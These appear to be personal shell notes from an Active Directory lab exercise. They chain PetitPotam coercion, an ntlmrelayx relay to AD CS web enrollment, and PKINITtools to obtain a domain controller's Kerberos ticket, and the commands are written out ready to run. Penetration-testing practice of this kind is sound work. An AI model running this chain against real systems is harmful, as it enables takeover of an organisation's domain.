
```

/home/peter/.local/bin/ntlmrelayx.py -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController


/home/peter/.local/share/pipx/venvs/netexec/lib/python3.12/site-packages/nxc/modules/petitpotam.py

/home/peter/.local/share/pipx/venvs/netexec/lib/python3.12/site-packages/nxc/modules/petitpotam.py 192.168.56.1 192.168.56.12

python3 PetitPotam.py 192.168.56.1 192.168.56.12


THIS IS OUTDATED
./gettgtpkinit.py -pfx-base64 $(cat ../cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'


LETS USE THIS INSTEAD:
https://github.com/dirkjanm/PKINITtools/blob/master/README.md
git clone https://github.com/dirkjanm/PKINITtools
pip3 install impacket minikerberos

-cert-pfx

virtual env first
  118  pip3 install impacket minikerberos
  119  gettgtpkinit.py
  120  python gettgtpkinit.py
  121  python3 gettgtpkinit.py
  122  ./gettgtpkinit.py
  123  pip3 install -I git+https://github.com/wbond/oscrypto.git
  124  ./gettgtpkinit.py


./gettgtpkinit.py -cert-pfx ../../MEEREEN\$.pfx essos.local/meereen$ meereen.ccache


```